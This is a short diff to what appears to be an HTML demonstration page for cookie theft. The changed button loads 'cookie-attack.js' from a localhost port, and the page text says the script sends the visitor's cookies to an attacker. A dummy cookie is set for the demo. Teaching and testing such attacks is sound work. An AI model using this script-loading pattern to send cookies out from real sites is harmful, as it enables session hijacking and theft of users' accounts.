@@ -9,7 +9,9 @@
       Click to trigger a function that will send your cookies to an attacker:
     </p>
 
-    <button onclick="getScript('cookie-attack.js')">Click me</button>
+    <button onclick="getScript('https://localhost:9381/cookie-attack.js')">
+      Click me
+    </button>
 
     <script>
       document.cookie = "username=John Doe; SameSite=None; Secure;path=/";
